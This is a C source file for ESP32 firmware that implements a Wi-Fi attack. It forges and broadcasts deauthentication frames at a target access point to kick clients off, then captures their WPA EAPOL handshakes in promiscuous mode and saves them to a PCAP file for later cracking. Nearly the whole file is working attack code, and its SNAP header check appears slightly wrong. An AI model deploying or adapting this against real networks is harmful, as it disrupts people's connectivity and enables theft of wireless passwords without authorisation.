/**
 * handshake_capture.c
 *
 * Implements:
 *  - Switching the radio to the target channel
 *  - Sending broadcast deauth frames to disrupt clients
 *  - Enabling promiscuous mode + a callback to capture EAPOL handshake frames
 *  - Writing captured packets to /spiffs/handshake.pcap (PCAP format)
 *  - Restoring normal STA mode after capture
 */

#include "handshake_capture.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "pcap_writer.h"
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char* TAG = "hs_capture";
static bool g_capturing = false;
static uint8_t g_target_bssid[6];
static uint8_t g_target_channel = 1;

// Original callback (if you want to restore later; optional)
static wifi_promiscuous_cb_t orig_cb = NULL;

/**
 * @brief Build and send a single deauthentication frame.
 * 
 * @param dest   Destination MAC (client or broadcast).
 * @param src    Source MAC (AP’s MAC or ESP32’s MAC).
 * @param bssid  BSSID (AP’s MAC).
 */
static void send_deauth_frame(const uint8_t dest[6], const uint8_t src[6], const uint8_t bssid[6])
{
    uint8_t deauth[26];
    memset(deauth, 0, sizeof(deauth));
    // 802.11 header (24 bytes)
    deauth[0] = 0xc0; // Type: Mgmt (0), Subtype: Deauthentication (12)
    // Flags = 0
    memcpy(&deauth[4], dest, 6);    // Receiver (client or broadcast)
    memcpy(&deauth[10], src, 6);    // Transmitter
    memcpy(&deauth[16], bssid, 6);  // BSSID
    // Reason code (2 bytes)
    deauth[24] = 0x07;
    deauth[25] = 0x00; // Reason: Class 3 frame received from nonassociated STA

    // Send raw 802.11 frame (no header)
    esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
}

/**
 * @brief Promiscuous-mode callback: filter for EAPOL frames and write to PCAP.
 */
static void promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type)
{
    if (!g_capturing) return;

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*) buf;
    const uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    // Check 802.11 header to see if it's a Data frame
    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frame_type = (fc >> 2) & 0x3;
    if (frame_type != 2) {
        return; // Not a data frame
    }

    // LLC Snap header starts at offset 24 in 802.11 payload
    if (len < 30) return; // Too small to contain EAPOL

    const uint8_t* llc = payload + 24;
    // LLC Snap: DSAP=0xAA, SSAP=0xAA, Control=0x03,
    //   next three bytes OUI=00:0C:00, then Proto=0x888E (EAPOL)
    if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[3] == 0x00 && llc[4] == 0x0c && llc[5] == 0x00 &&
        llc[6] == 0x88 && llc[7] == 0x8e) {
        // We found an EAPOL frame. Write full 802.11 packet to PCAP.
        pcap_writer_write_packet(payload, len);
    }
}

esp_err_t handshake_deauth_and_capture(const uint8_t bssid[6], uint8_t channel, uint32_t duration_ms)
{
    if (g_capturing) {
        return ESP_ERR_INVALID_STATE;
    }
    memcpy(g_target_bssid, bssid, 6);
    g_target_channel = channel;

    // 1) Stop normal Wi-Fi & promiscuous
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();

    // 2) Switch to target channel (promiscuous will sniff that channel)
    esp_wifi_set_channel(g_target_channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);

    // 3) Initialize PCAP writer (creates /spiffs/handshake.pcap)
    if (!pcap_writer_init("/spiffs/handshake.pcap")) {
        ESP_LOGE(TAG, "PCAP init failed");
        return ESP_FAIL;
    }

    // 4) Register callback for promiscuous RX
    orig_cb = esp_wifi_set_promiscuous_rx_cb(promisc_cb);

    g_capturing = true;
    ESP_LOGI(TAG, "Starting deauth + capture on channel %d", g_target_channel);

    // Get ESP32’s MAC as “fake AP MAC”
    uint8_t esp_mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, esp_mac);

    // 5) Send deauth frames repeatedly for duration_ms
    uint32_t start_ms = esp_timer_get_time() / 1000;
    while ((esp_timer_get_time() / 1000 - start_ms) < duration_ms) {
        // Broadcast address = ff:ff:ff:ff:ff:ff
        const uint8_t brc[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
        send_deauth_frame(brc, esp_mac, g_target_bssid);
        vTaskDelay(pdMS_TO_TICKS(10)); // ~100 deauth frames/sec
    }

    ESP_LOGI(TAG, "Deauth + capture period ended");

    // 6) Stop promiscuous & restore callback
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    // 7) Close PCAP writer
    pcap_writer_close();
    g_capturing = false;

    // 8) Restart normal STA mode so HTTP server stays reachable
    esp_wifi_stop();
    esp_wifi_start();

    return ESP_OK;
}
